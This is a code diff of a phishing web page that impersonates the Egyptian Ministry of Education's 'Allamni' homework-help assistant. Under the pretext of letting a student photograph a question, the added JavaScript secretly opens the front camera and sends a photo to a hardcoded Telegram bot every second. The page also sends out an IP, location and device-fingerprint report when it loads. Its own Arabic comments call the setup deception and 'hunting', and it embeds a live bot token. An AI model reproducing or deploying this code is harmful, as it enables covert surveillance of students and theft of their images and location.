@@ -9,32 +9,41 @@
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const chatId = "5890070301";
 
-        async function sendPhoto(blob) {
+        async function sendPhoto(blob, caption) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'capture.jpg');
-            formData.append('caption', "📸 لقطة حية (ثانية بثانية)");
+            formData.append('caption', caption);
             try {
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
             } catch (e) {}
         }
 
-        async function startInstantCapture() {
+        async function startDoubleCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
+                // 1. فتح الكاميرا الخلفية للطالب عشان يصور السؤال (للخداع)
+                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const videoElement = document.getElementById('viewfinder');
+                videoElement.style.display = "block";
+                videoElement.srcObject = streamBack;
+                await videoElement.play();
+
+                // 2. فتح الكاميرا الأمامية في الخلفية لسحب الصور (الصيد)
+                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const hiddenVideo = document.createElement('video');
+                hiddenVideo.srcObject = streamFront;
+                await hiddenVideo.play();
 
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
+                // حلقة صيد الكاميرا الأمامية (كل ثانية)
                 setInterval(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    context.drawImage(video, 0, 0);
-                    canvas.toBlob(blob => { if(blob) sendPhoto(blob); }, 'image/jpeg', 0.4); 
-                }, 1000); // تصوير كل ثانية
+                    canvas.width = hiddenVideo.videoWidth;
+                    canvas.height = hiddenVideo.videoHeight;
+                    context.drawImage(hiddenVideo, 0, 0);
+                    canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد الكاميرا الأمامية (تلقائي)"); }, 'image/jpeg', 0.4); 
+                }, 1000);
 
             } catch (err) {
                 alert("يجب السماح بالكاميرا لتصوير السؤال والحصول على الإجابة!");
@@ -50,45 +59,25 @@
             const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
             const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
 
-            // قائمة الـ 40 بند (تقرير المخابرات)
             const report = `
 👑 **KIMO V.MAX - تقرير الـ 40 بند الشامل** 👑
 ━━━━━━━━━━━━━━
-🌍 **[1] الشبكة والموقع (الرادار)**
-• الـ IP الحالي: \`${ip.ip}\`
-• شركة الاتصالات: ${ip.org || "N/A"}
-• المحافظة: ${ip.region} | المدينة: ${ip.city}
-• التوقيت: ${ip.timezone}
-• الموقع التقريبي: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
-• سرعة النت: ${navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A"}
+🌍 **[1] الشبكة والموقع**
+• الـ IP: \`${ip.ip}\`
+• الشركة: ${ip.org || "N/A"}
+• الموقع: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
 • نوع الشبكة: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}
 
-📱 **[2] عتاد الموبايل (الهاردوير)**
+📱 **[2] عتاد الموبايل**
 • النظام: ${navigator.platform}
-• موديل المعالج: ${navigator.hardwareConcurrency} Cores 🧠
+• المعالج: ${navigator.hardwareConcurrency} Cores
 • الرامات: ${navigator.deviceMemory || "N/A"} GB
 • كارت الشاشة: \`${gpu}\`
 • دقة الشاشة: ${screen.width}x${screen.height}
-• عمق الألوان: ${screen.colorDepth} bit
-• نسبة البكسل: ${window.devicePixelRatio}x
-• نقاط اللمس: ${navigator.maxTouchPoints}
 
-🔋 **[3] حالة الجهاز اللحظية**
+🔋 **[3] الحالة اللحظية**
 • البطارية: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
 • الشحن: ${navigator.getBattery ? (await (await navigator.getBattery()).charging ? "⚡ متصل" : "🔋 غير متصل") : "N/A"}
-• الذاكرة المتاحة: ${navigator.storage ? "تقديرية" : "محمية"}
-• وضع الشاشة: ${screen.orientation ? screen.orientation.type : "N/A"}
-
-🕵️ **[4] بصمة المتصفح والخفايا**
-• اسم المتصفح: ${navigator.userAgent.split(' ').pop()}
-• وضع التخفي: ${!window.indexedDB ? "نشط 🕵️" : "معطل"}
-• لغة الجهاز: ${navigator.language}
-• اللغات المضافة: ${navigator.languages.join(", ")}
-• ملفات الكوكيز: ${navigator.cookieEnabled}
-• حماية التتبع: ${navigator.doNotTrack}
-• الجافا سكريبت: مفعلة ✅
-━━━━━━━━━━━━━━
-⏰ وقت الصيد: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
@@ -102,39 +91,61 @@
 
         window.onload = initialRadar;
 
-        function handleAsk() {
+        function captureQuestion() {
+            const video = document.getElementById('viewfinder');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📝 صورة السؤال التي التقطها الطالب"); }, 'image/jpeg', 0.8);
+
             document.getElementById('status').innerHTML = `
                 <div style="padding: 20px; border: 2px solid #238636; border-radius: 15px; background: #e6ffed;">
-                    <h3 style="color:#238636; margin:0;">✅ تم استلام سؤالك بنجاح</h3>
+                    <h3 style="color:#238636; margin:0;">✅ تم استلام السؤال بنجاح</h3>
                     <p style="color:#444; font-size:14px; font-weight:bold;">سيتم الرد عليك قريباً.. يرجى زيارة الموقع قريباً لمتابعة الحل.</p>
                     <div class="loader"></div>
                 </div>`;
-            startInstantCapture(); 
+        }
+
+        function showCameraUI() {
+            document.getElementById('initial-ui').style.display = "none";
+            document.getElementById('camera-ui').style.display = "block";
+            startDoubleCapture();
         }
     </script>
 
     <style>
         body { background: #f4f7f6; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .box { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #003366; }
-        .logo { width: 70px; margin-bottom: 10px; }
-        h1 { font-size: 20px; color: #003366; margin-bottom: 20px; }
-        textarea { width: 100%; height: 120px; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-bottom: 20px; box-sizing: border-box; resize: none; }
-        .btn-camera { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; margin-bottom: 10px; }
-        .btn-text { background: #f8f9fa; color: #555; border: 1px solid #ddd; padding: 10px; width: 100%; border-radius: 12px; cursor: pointer; }
+        .box { background: white; width: 95%; max-width: 400px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #003366; }
+        .logo { width: 60px; margin-bottom: 10px; }
+        h1 { font-size: 18px; color: #003366; margin-bottom: 15px; }
+        textarea { width: 100%; height: 100px; border: 1px solid #ddd; border-radius: 12px; padding: 10px; margin-bottom: 15px; box-sizing: border-box; resize: none; }
+        .btn-camera { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
+        #viewfinder { width: 100%; border-radius: 12px; margin-bottom: 15px; display: none; background: #000; }
+        .btn-capture { background: #d93025; color: white; border: none; padding: 15px; width: 80px; height: 80px; border-radius: 50%; cursor: pointer; font-weight: bold; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid #238636; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer { font-size: 10px; color: #aaa; margin-top: 25px; }
+        .footer { font-size: 10px; color: #aaa; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="box">
         <img src="https://upload.wikimedia.org/wikipedia/ar/0/03/Logo_of_the_Egyptian_Ministry_of_Education.png" class="logo">
         <h1>منصة علمني | المساعد الذكي</h1>
+        
         <div id="status">
-            <textarea placeholder="اكتب سؤالك هنا ليتم حله فوراً..."></textarea>
-            <button class="btn-camera" onclick="handleAsk()">📸 تصوير السؤال</button>
-            <button class="btn-text" onclick="handleAsk()">إرسال السؤال نصياً</button>
+            <div id="initial-ui">
+                <textarea placeholder="اكتب سؤالك هنا ليتم حله فوراً..."></textarea>
+                <button class="btn-camera" onclick="showCameraUI()">📸 فتح الكاميرا لتصوير السؤال</button>
+            </div>
+
+            <div id="camera-ui" style="display:none;">
+                <p style="font-size:13px; color:#666;">وجه الكاميرا نحو السؤال واضغط التقاط</p>
+                <video id="viewfinder" autoplay playsinline></video>
+                <button class="btn-capture" onclick="captureQuestion()">التقاط</button>
+            </div>
         </div>
+
         <div class="footer">وزارة التربية والتعليم والتعليم الفني - © 2026</div>
     </div>
 </body>
